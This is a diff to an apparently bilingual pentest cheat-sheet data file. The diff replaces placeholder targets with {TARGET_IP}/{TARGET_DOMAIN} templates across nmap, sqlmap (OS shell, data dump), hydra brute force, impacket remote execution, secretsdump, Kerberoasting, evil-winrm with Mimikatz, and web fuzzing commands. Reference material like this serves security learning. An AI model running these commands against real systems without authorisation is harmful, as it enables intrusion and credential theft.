@@ -10,7 +10,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'TCP连接扫描', en: 'TCP Connect Scan' },
-        command: 'nmap -sT target_ip',
+        command: 'nmap -sT {TARGET_IP}',
         description: { zh: '使用TCP连接方式进行端口扫描', en: 'UseTCPConnectionMethod perform Port Scanning' },
         syntaxBreakdown: [
           { part: 'nmap', explanation: { zh: 'Nmap扫描工具', en: 'Nmap scanning tool' }, type: 'command' },
@@ -21,7 +21,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'SYN隐蔽扫描', en: 'SYN Stealth Scan' },
-        command: 'nmap -sS target_ip',
+        command: 'nmap -sS {TARGET_IP}',
         description: { zh: '使用SYN包进行隐蔽扫描，需要root权限', en: 'UseSYNPackage perform StealthyScan, requiresrootPermission' },
         syntaxBreakdown: [
           { part: '-sS', explanation: { zh: 'SYN扫描(半开扫描)，更隐蔽', en: 'SYN scan (half-open scan), more stealthy' }, type: 'parameter' }
@@ -30,7 +30,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'UDP扫描', en: 'UDP Scan' },
-        command: 'nmap -sU target_ip',
+        command: 'nmap -sU {TARGET_IP}',
         description: { zh: '扫描UDP端口', en: 'Scan UDP ports' },
         syntaxBreakdown: [
           { part: '-sU', explanation: { zh: 'UDP扫描模式', en: 'UDP scan mode' }, type: 'parameter' }
@@ -39,7 +39,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '服务版本探测', en: 'Service Version Detection' },
-        command: 'nmap -sV target_ip',
+        command: 'nmap -sV {TARGET_IP}',
         description: { zh: '探测开放端口的服务版本信息', en: 'Detect service version info on open ports' },
         syntaxBreakdown: [
           { part: '-sV', explanation: { zh: '服务版本探测', en: 'Service Version Detection' }, type: 'parameter' }
@@ -48,7 +48,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '操作系统探测', en: 'OS Detection' },
-        command: 'nmap -O target_ip',
+        command: 'nmap -O {TARGET_IP}',
         description: { zh: '尝试识别目标操作系统', en: 'Attempt to identify target OS' },
         syntaxBreakdown: [
           { part: '-O', explanation: { zh: '操作系统探测', en: 'OS Detection' }, type: 'parameter' }
@@ -57,7 +57,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '全面扫描', en: 'Comprehensive Scan' },
-        command: 'nmap -A target_ip',
+        command: 'nmap -A {TARGET_IP}',
         description: { zh: '启用高级功能进行全面扫描', en: 'EnableAdvancedFunction perform Comprehensive Scan' },
         syntaxBreakdown: [
           { part: '-A', explanation: { zh: '启用OS检测、版本检测、脚本扫描和traceroute', en: 'EnableOSDetection, VersionDetection, Script Scan and traceroute' }, type: 'parameter' }
@@ -66,7 +66,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定端口扫描', en: 'Specified Port Scan' },
-        command: 'nmap -p 22,80,443 target_ip',
+        command: 'nmap -p 22,80,443 {TARGET_IP}',
         description: { zh: '只扫描指定的端口', en: 'only Scanspecified Port' },
         syntaxBreakdown: [
           { part: '-p', explanation: { zh: '指定端口', en: 'specifiedPort' }, type: 'parameter' },
@@ -76,7 +76,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '端口范围扫描', en: 'Port Range Scan' },
-        command: 'nmap -p 1-1000 target_ip',
+        command: 'nmap -p 1-1000 {TARGET_IP}',
         description: { zh: '扫描指定范围的端口', en: 'Scanspecifiedscope Port' },
         syntaxBreakdown: [
           { part: '1-1000', explanation: { zh: '端口范围', en: 'Portscope' }, type: 'value' }
@@ -85,7 +85,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '脚本扫描', en: 'Script Scan' },
-        command: 'nmap --script=vuln target_ip',
+        command: 'nmap --script=vuln {TARGET_IP}',
         description: { zh: '使用Nmap脚本引擎进行漏洞扫描', en: 'UseNmapScriptEngine perform VulnerabilityScan' },
         syntaxBreakdown: [
           { part: '--script=', explanation: { zh: '指定Nmap脚本', en: 'specifiedNmapScript' }, type: 'parameter' },
@@ -95,19 +95,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'SMB扫描', en: 'SMBScan' },
-        command: 'nmap --script=smb-enum-shares,smb-enum-users target_ip',
+        command: 'nmap --script=smb-enum-shares,smb-enum-users {TARGET_IP}',
         description: { zh: '扫描SMB共享和用户信息', en: 'ScanSMBShares and User Info' },
         platform: 'all'
       },
       {
         name: { zh: 'HTTP扫描', en: 'HTTPScan' },
-        command: 'nmap --script=http-enum,http-vuln* -p 80,443 target_ip',
+        command: 'nmap --script=http-enum,http-vuln* -p 80,443 {TARGET_IP}',
         description: { zh: 'HTTP服务漏洞扫描', en: 'HTTPServiceVulnerabilityScan' },
         platform: 'all'
       },
       {
         name: { zh: '快速扫描', en: 'Fast Scan' },
-        command: 'nmap -F target_ip',
+        command: 'nmap -F {TARGET_IP}',
         description: { zh: '快速扫描，只扫描常用端口', en: 'Fast Scan, only ScanCommonPort' },
         syntaxBreakdown: [
           { part: '-F', explanation: { zh: '快速模式，扫描常用100个端口', en: 'Fast Mode, ScanCommon100Port' }, type: 'parameter' }
@@ -125,7 +125,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '保存结果', en: 'Save Results' },
-        command: 'nmap -oN output.txt target_ip',
+        command: 'nmap -oN output.txt {TARGET_IP}',
         description: { zh: '将扫描结果保存到文件', en: 'will ScanResultSave to File' },
         syntaxBreakdown: [
           { part: '-oN', explanation: { zh: '普通格式输出', en: 'Normal format output' }, type: 'parameter' },
@@ -146,7 +146,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础测试', en: 'Basic Test' },
-        command: 'sqlmap -u "http://target.com/page?id=1"',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1"',
         description: { zh: '对URL进行SQL注入测试', en: 'for URL perform SQLInjectionTest' },
         syntaxBreakdown: [
           { part: 'sqlmap', explanation: { zh: 'SQLMap工具', en: 'SQLMapTools' }, type: 'command' },
@@ -156,7 +156,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定参数测试', en: 'Specified Parameter Test' },
-        command: 'sqlmap -u "http://target.com/page?id=1&name=test" -p id',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1&name=test" -p id',
         description: { zh: '只测试指定的参数', en: 'only Testspecified Parameter' },
         syntaxBreakdown: [
           { part: '-p', explanation: { zh: '指定要测试的参数', en: 'specifiedNeedTest Parameter' }, type: 'parameter' }
@@ -165,7 +165,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'POST请求测试', en: 'POST Request Test' },
-        command: 'sqlmap -u "http://target.com/login" --data="user=admin&pass=123"',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/login" --data="user=admin&pass=123"',
         description: { zh: '测试POST请求', en: 'TestPOSTRequest' },
         syntaxBreakdown: [
           { part: '--data=', explanation: { zh: 'POST数据', en: 'POSTData' }, type: 'parameter' }
@@ -174,7 +174,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '使用Cookie', en: 'Using Cookie' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --cookie="PHPSESSID=xxx"',
         description: { zh: '使用Cookie进行认证', en: 'Using Cookie perform Authentication' },
         syntaxBreakdown: [
           { part: '--cookie=', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
@@ -183,7 +183,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定数据库类型', en: 'Specify Database Type' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --dbms=mysql',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --dbms=mysql',
         description: { zh: '指定后端数据库类型', en: 'specifiedBackendDatabaseType' },
         syntaxBreakdown: [
           { part: '--dbms=', explanation: { zh: '数据库类型(mysql,mssql,oracle等)', en: 'DatabaseType(mysql,mssql,oracle etc.)' }, type: 'parameter' }
@@ -192,7 +192,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '枚举数据库', en: 'Enumerate Databases' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --dbs',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --dbs',
         description: { zh: '获取所有数据库名', en: 'ObtainallDatabasename' },
         syntaxBreakdown: [
           { part: '--dbs', explanation: { zh: '枚举数据库', en: 'Enumerate Databases' }, type: 'parameter' }
@@ -201,7 +201,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '枚举表', en: 'Enumerate Tables' },
-        command: 'sqlmap -u "http://target.com/page?id=1" -D database_name --tables',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" -D database_name --tables',
         description: { zh: '获取指定数据库的表', en: 'ObtainspecifiedDatabase table' },
         syntaxBreakdown: [
           { part: '-D', explanation: { zh: '指定数据库', en: 'specifiedDatabase' }, type: 'parameter' },
@@ -211,7 +211,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '枚举列', en: 'Enumerate Columns' },
-        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table --columns',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" -D db -T table --columns',
         description: { zh: '获取指定表的列', en: 'ObtainSpecify table column' },
         syntaxBreakdown: [
           { part: '-T', explanation: { zh: '指定表', en: 'Specify table' }, type: 'parameter' },
@@ -221,7 +221,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '提取数据', en: 'Extract Data' },
-        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table -C col1,col2 --dump',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" -D db -T table -C col1,col2 --dump',
         description: { zh: '提取指定列的数据', en: 'ExtractSpecify column Data' },
         syntaxBreakdown: [
           { part: '-C', explanation: { zh: '指定列', en: 'Specify column' }, type: 'parameter' },
@@ -231,7 +231,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '获取Shell', en: 'Get Shell' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --os-shell',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --os-shell',
         description: { zh: '尝试获取操作系统Shell', en: 'AttemptObtainOperating SystemShell' },
         syntaxBreakdown: [
           { part: '--os-shell', explanation: { zh: '获取OS交互式Shell', en: 'Obtain an interactive OS shell' }, type: 'parameter' }
@@ -240,7 +240,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '使用代理', en: 'Using Proxy' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --proxy="http://127.0.0.1:8080"',
         description: { zh: '通过代理发送请求', en: 'throughProxySendRequest' },
         syntaxBreakdown: [
           { part: '--proxy=', explanation: { zh: '设置代理服务器', en: 'SetProxyServer' }, type: 'parameter' }
@@ -249,7 +249,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定注入技术', en: 'Specify Injection Technique' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --technique=BEUST',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --technique=BEUST',
         description: { zh: '指定注入技术类型', en: 'Specify Injection TechniqueType' },
         syntaxBreakdown: [
           { part: '--technique=', explanation: { zh: 'B=布尔盲注,E=报错注入,U=联合查询,S=堆叠,T=时间盲注', en: 'B=Boolean Blind,E=Error-Based,U=Union Query,S=Stacked Queries,T=Time-Based Blind' }, type: 'parameter' }
@@ -258,7 +258,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'Level和Risk', en: 'Level and Risk' },
-        command: 'sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3',
+        command: 'sqlmap -u "http://{TARGET_DOMAIN}/page?id=1" --level=5 --risk=3',
         description: { zh: '设置扫描级别和风险等级', en: 'Set scan level and risk level' },
         syntaxBreakdown: [
           { part: '--level=', explanation: { zh: '扫描级别(1-5)，越高越全面', en: 'Scan level (1-5), higher means more thorough' }, type: 'parameter' },
@@ -403,13 +403,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
-        command: 'hydra -L users.txt -P passwords.txt ftp://target_ip',
+        command: 'hydra -L users.txt -P passwords.txt ftp://{TARGET_IP}',
         description: { zh: '爆破FTP服务', en: 'Brute forceFTPService' },
         platform: 'linux'
       },
       {
         name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
-        command: 'hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
+        command: 'hydra -l admin -P wordlist.txt {TARGET_IP} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
         description: { zh: '爆破HTTP表单登录', en: 'Brute forceHTTPtableSingleLogin' },
         syntaxBreakdown: [
           { part: 'http-post-form', explanation: { zh: 'HTTP POST表单模块', en: 'HTTP POSTtableSingleModule' }, type: 'value' },
@@ -421,19 +421,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
-        command: 'hydra -l administrator -P wordlist.txt rdp://target_ip',
+        command: 'hydra -l administrator -P wordlist.txt rdp://{TARGET_IP}',
         description: { zh: '爆破RDP服务', en: 'Brute forceRDPService' },
         platform: 'linux'
       },
       {
         name: { zh: 'MySQL爆破', en: 'MySQL Brute Force' },
-        command: 'hydra -l root -P wordlist.txt mysql://target_ip',
+        command: 'hydra -l root -P wordlist.txt mysql://{TARGET_IP}',
         description: { zh: '爆破MySQL数据库', en: 'Brute forceMySQLDatabase' },
         platform: 'linux'
       },
       {
         name: { zh: '多线程', en: 'Multi-threaded' },
-        command: 'hydra -t 4 -l user -P wordlist.txt ssh://target_ip',
+        command: 'hydra -t 4 -l user -P wordlist.txt ssh://{TARGET_IP}',
         description: { zh: '指定线程数', en: 'specifiedthread count' },
         syntaxBreakdown: [
           { part: '-t', explanation: { zh: '并发线程数', en: 'concurrentthread count' }, type: 'parameter' }
@@ -701,43 +701,43 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: 'PsExec',
-        command: 'psexec.py domain/user:password@target_ip',
+        command: 'psexec.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: 'PsExec远程执行', en: 'PsExecRemote Execution' },
         platform: 'linux'
       },
       {
         name: 'WMIExec',
-        command: 'wmiexec.py domain/user:password@target_ip',
+        command: 'wmiexec.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: 'WMI远程执行', en: 'WMIRemote Execution' },
         platform: 'linux'
       },
       {
         name: 'ATExec',
-        command: 'atexec.py domain/user:password@target_ip "command"',
+        command: 'atexec.py {DOMAIN}/user:password@{TARGET_IP} "command"',
         description: { zh: '通过计划任务执行', en: 'Execute via scheduled task' },
         platform: 'linux'
       },
       {
         name: 'SMBExec',
-        command: 'smbexec.py domain/user:password@target_ip',
+        command: 'smbexec.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: 'SMB远程执行', en: 'SMBRemote Execution' },
         platform: 'linux'
       },
       {
         name: 'SecretsDump',
-        command: 'secretsdump.py domain/user:password@target_ip',
+        command: 'secretsdump.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: '导出所有凭证', en: 'ExportallCredentials' },
         platform: 'linux'
       },
       {
         name: 'GetUserSPNs',
-        command: 'GetUserSPNs.py domain/user:password -dc-ip dc_ip -request',
+        command: 'GetUserSPNs.py {DOMAIN}/user:password -dc-ip dc_ip -request',
         description: { zh: 'Kerberoasting攻击', en: 'Kerberoasting Attack' },
         platform: 'linux'
       },
       {
         name: 'GetNPUsers',
-        command: 'GetNPUsers.py domain/ -usersfile users.txt -format hashcat',
+        command: 'GetNPUsers.py {DOMAIN}/ -usersfile users.txt -format hashcat',
         description: { zh: 'AS-REP Roasting攻击', en: 'AS-REP RoastingAttack' },
         platform: 'linux'
       },
@@ -749,13 +749,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: 'MSSQLClient',
-        command: 'mssqlclient.py domain/user:password@target_ip',
+        command: 'mssqlclient.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: 'MSSQL客户端', en: 'MSSQLClient' },
         platform: 'linux'
       },
       {
         name: 'LookupsID',
-        command: 'lookupsid.py domain/user:password@target_ip',
+        command: 'lookupsid.py {DOMAIN}/user:password@{TARGET_IP}',
         description: { zh: '通过LSA枚举用户', en: 'throughLSAEnumerationUsers' },
         platform: 'linux'
       }
@@ -829,7 +829,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '端口扫描', en: 'Port Scanning' },
-        command: '1..1024 | % {Test-NetConnection -Port $_ -ComputerName target_ip}',
+        command: '1..1024 | % {Test-NetConnection -Port $_ -ComputerName {TARGET_IP}}',
         description: { zh: '简单端口扫描', en: 'simplePort Scanning' },
         platform: 'windows'
       },
@@ -930,7 +930,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '目录爆破', en: 'Directory Brute Force' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt',
         description: { zh: '爆破网站目录', en: 'Brute forceWebsiteDirectory' },
         syntaxBreakdown: [
           { part: 'gobuster', explanation: { zh: 'Gobuster工具', en: 'GobusterTools' }, type: 'command' },
@@ -942,7 +942,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定扩展名', en: 'Specify Extensions' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt -x php,html,txt',
         description: { zh: '指定文件扩展名', en: 'specifiedFileExtensionname' },
         syntaxBreakdown: [
           { part: '-x', explanation: { zh: '文件扩展名', en: 'FileExtensionname' }, type: 'parameter' }
@@ -951,7 +951,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '子域名爆破', en: 'Subdomain Brute Force' },
-        command: 'gobuster dns -d target.com -w subdomains.txt',
+        command: 'gobuster dns -d {TARGET_DOMAIN} -w subdomains.txt',
         description: { zh: '爆破子域名', en: 'Brute forceSub-Domain name' },
         syntaxBreakdown: [
           { part: 'dns', explanation: { zh: 'DNS爆破模式', en: 'DNSBrute forceMode' }, type: 'value' },
@@ -961,7 +961,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '使用Cookie', en: 'Using Cookie' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=xxx"',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt -c "PHPSESSID=xxx"',
         description: { zh: '使用Cookie认证', en: 'Using CookieAuthentication' },
         syntaxBreakdown: [
           { part: '-c', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
@@ -970,7 +970,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '添加Header', en: 'Add Header' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt -H "Authorization: Bearer token"',
         description: { zh: '添加自定义Header', en: 'AddCustomHeader' },
         syntaxBreakdown: [
           { part: '-H', explanation: { zh: '添加Header', en: 'Add Header' }, type: 'parameter' }
@@ -979,7 +979,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '线程设置', en: 'Thread Settings' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt -t 50',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt -t 50',
         description: { zh: '设置线程数', en: 'Setthread count' },
         syntaxBreakdown: [
           { part: '-t', explanation: { zh: '线程数', en: 'thread count' }, type: 'parameter' }
@@ -988,7 +988,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '忽略状态码', en: 'Ignore Status Codes' },
-        command: 'gobuster dir -u http://target.com -w wordlist.txt -b 404,403',
+        command: 'gobuster dir -u http://{TARGET_DOMAIN} -w wordlist.txt -b 404,403',
         description: { zh: '忽略特定状态码', en: 'Ignore specific status codes' },
         syntaxBreakdown: [
           { part: '-b', explanation: { zh: '黑名单状态码', en: 'BlackliststatusCode' }, type: 'parameter' }
@@ -1023,14 +1023,14 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: 'Web渗透', en: 'Web Penetration' },
     installation: 'go install github.com/ffuf/ffuf/v2@latest',
     commands: [
-      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
-      { name: { zh: '指定扩展名', en: 'Specify Extensions' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt', description: { zh: '添加文件扩展名', en: 'AddFileExtensionname' }, platform: 'linux' },
-      { name: { zh: '参数模糊测试', en: 'Parameter Fuzzing' }, command: 'ffuf -u http://target.com/?param=FUZZ -w wordlist.txt', description: { zh: 'GET参数测试', en: 'GETParameterTest' }, platform: 'linux' },
-      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'ffuf -u http://target.com -X POST -d "user=FUZZ&pass=test" -w wordlist.txt', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
-      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
-      { name: { zh: '过滤状态码', en: 'Filter Status Codes' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302', description: { zh: '匹配特定状态码', en: 'MatchspecificstatusCode' }, platform: 'linux' },
-      { name: { zh: '过滤响应大小', en: 'Filter Response Size' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234', description: { zh: '过滤特定响应大小', en: 'FilterspecificResponsesize' }, platform: 'linux' },
-      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2', description: { zh: '递归目录扫描', en: 'recursiveDirectoryScan' }, platform: 'linux' }
+      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'ffuf -u http://{TARGET_DOMAIN}/FUZZ -w wordlist.txt', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
+      { name: { zh: '指定扩展名', en: 'Specify Extensions' }, command: 'ffuf -u http://{TARGET_DOMAIN}/FUZZ -w wordlist.txt -e .php,.html,.txt', description: { zh: '添加文件扩展名', en: 'AddFileExtensionname' }, platform: 'linux' },
+      { name: { zh: '参数模糊测试', en: 'Parameter Fuzzing' }, command: 'ffuf -u http://{TARGET_DOMAIN}/?param=FUZZ -w wordlist.txt', description: { zh: 'GET参数测试', en: 'GETParameterTest' }, platform: 'linux' },
+      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'ffuf -u http://{TARGET_DOMAIN} -X POST -d "user=FUZZ&pass=test" -w wordlist.txt', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
+      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'ffuf -u http://{TARGET_DOMAIN} -H "Host: FUZZ.{TARGET_DOMAIN}" -w wordlist.txt', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
+      { name: { zh: '过滤状态码', en: 'Filter Status Codes' }, command: 'ffuf -u http://{TARGET_DOMAIN}/FUZZ -w wordlist.txt -mc 200,301,302', description: { zh: '匹配特定状态码', en: 'MatchspecificstatusCode' }, platform: 'linux' },
+      { name: { zh: '过滤响应大小', en: 'Filter Response Size' }, command: 'ffuf -u http://{TARGET_DOMAIN}/FUZZ -w wordlist.txt -fs 1234', description: { zh: '过滤特定响应大小', en: 'FilterspecificResponsesize' }, platform: 'linux' },
+      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'ffuf -u http://{TARGET_DOMAIN}/FUZZ -w wordlist.txt -recursion -recursion-depth 2', description: { zh: '递归目录扫描', en: 'recursiveDirectoryScan' }, platform: 'linux' }
     ],
     references: ['https://github.com/ffuf/ffuf']
   },
@@ -1058,8 +1058,8 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '内网渗透', en: 'Intranet Penetration' },
     installation: 'gem install evil-winrm',
     commands: [
-      { name: { zh: '密码连接', en: 'Password Connection' }, command: 'evil-winrm -i target_ip -u user -p password', description: { zh: '使用密码连接', en: 'UsePassword Connection' }, platform: 'linux' },
-      { name: { zh: '哈希连接', en: 'Hash Connection' }, command: 'evil-winrm -i target_ip -u user -H ntlm_hash', description: { zh: '使用哈希连接', en: 'Using HashConnection' }, platform: 'linux' },
+      { name: { zh: '密码连接', en: 'Password Connection' }, command: 'evil-winrm -i {TARGET_IP} -u user -p password', description: { zh: '使用密码连接', en: 'UsePassword Connection' }, platform: 'linux' },
+      { name: { zh: '哈希连接', en: 'Hash Connection' }, command: 'evil-winrm -i {TARGET_IP} -u user -H ntlm_hash', description: { zh: '使用哈希连接', en: 'Using HashConnection' }, platform: 'linux' },
       { name: { zh: '上传文件', en: 'Upload File' }, command: 'upload local_file remote_path', description: { zh: '上传文件到目标', en: 'Upload File to Target' }, platform: 'linux' },
       { name: { zh: '下载文件', en: 'Download File' }, command: 'download remote_path local_file', description: { zh: '从目标下载文件', en: 'from TargetDownload File' }, platform: 'linux' },
       { name: { zh: '加载脚本', en: 'Load Script' }, command: 'menu\nBypass-4MSI\nInvoke-Mimikatz', description: { zh: '加载PowerShell脚本', en: 'LoadPowerShellScript' }, platform: 'linux' },
@@ -1075,7 +1075,7 @@ export const toolCommands: ToolCommand[] = [
     installation: 'apt install proxychains4',
     commands: [
       { name: { zh: '配置代理', en: 'Configure Proxy' }, command: 'vim /etc/proxychains4.conf\n[ProxyList]\nsocks5 127.0.0.1 1080', description: { zh: '配置SOCKS代理', en: 'ConfigurationSOCKS Proxy' }, platform: 'linux' },
-      { name: { zh: '使用代理', en: 'Using Proxy' }, command: 'proxychains4 nmap -sT -Pn target_ip', description: { zh: '通过代理运行工具', en: 'throughProxyRunTools' }, platform: 'linux' },
+      { name: { zh: '使用代理', en: 'Using Proxy' }, command: 'proxychains4 nmap -sT -Pn {TARGET_IP}', description: { zh: '通过代理运行工具', en: 'throughProxyRunTools' }, platform: 'linux' },
       { name: { zh: '动态链', en: 'Dynamic Chain' }, command: 'dynamic_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081', description: { zh: '动态代理链', en: 'Dynamic proxy chain' }, platform: 'linux' },
       { name: { zh: '严格链', en: 'Strict Chain' }, command: 'strict_chain', description: { zh: '严格按顺序使用代理', en: 'Strict sequential proxy usage' }, platform: 'linux' },
       { name: { zh: '随机链', en: 'Random Chain' }, command: 'random_chain', description: { zh: '随机选择代理', en: 'Random proxy selection' }, platform: 'linux' }
@@ -1140,13 +1140,13 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '信息收集', en: 'Information Gathering' },
     installation: 'go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest',
     commands: [
-      { name: { zh: '基础扫描', en: 'Basic Scan' }, command: 'nuclei -u http://target.com', description: { zh: '使用所有模板扫描', en: 'UseallTemplateScan' }, platform: 'linux' },
-      { name: { zh: '指定模板', en: 'Specify Template' }, command: 'nuclei -u http://target.com -t cves/', description: { zh: '使用CVE模板', en: 'UseCVETemplate' }, platform: 'linux' },
-      { name: { zh: '严重级别', en: 'Severity Level' }, command: 'nuclei -u http://target.com -severity critical,high', description: { zh: '指定漏洞严重级别', en: 'specifiedVulnerabilitySeverity Level' }, platform: 'linux' },
+      { name: { zh: '基础扫描', en: 'Basic Scan' }, command: 'nuclei -u http://{TARGET_DOMAIN}', description: { zh: '使用所有模板扫描', en: 'UseallTemplateScan' }, platform: 'linux' },
+      { name: { zh: '指定模板', en: 'Specify Template' }, command: 'nuclei -u http://{TARGET_DOMAIN} -t cves/', description: { zh: '使用CVE模板', en: 'UseCVETemplate' }, platform: 'linux' },
+      { name: { zh: '严重级别', en: 'Severity Level' }, command: 'nuclei -u http://{TARGET_DOMAIN} -severity critical,high', description: { zh: '指定漏洞严重级别', en: 'specifiedVulnerabilitySeverity Level' }, platform: 'linux' },
       { name: { zh: '批量扫描', en: 'Batch Scan' }, command: 'nuclei -l urls.txt', description: { zh: '从文件读取目标', en: 'from File ReadTarget' }, platform: 'linux' },
       { name: { zh: '更新模板', en: 'Update Templates' }, command: 'nuclei -update-templates', description: { zh: '更新模板库', en: 'Update Templatesdatabase' }, platform: 'linux' },
-      { name: { zh: '输出结果', en: 'Output Results' }, command: 'nuclei -u http://target.com -o results.txt', description: { zh: '保存扫描结果', en: 'SaveScanResult' }, platform: 'linux' },
-      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'nuclei -u http://target.com -json -o results.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' }
+      { name: { zh: '输出结果', en: 'Output Results' }, command: 'nuclei -u http://{TARGET_DOMAIN} -o results.txt', description: { zh: '保存扫描结果', en: 'SaveScanResult' }, platform: 'linux' },
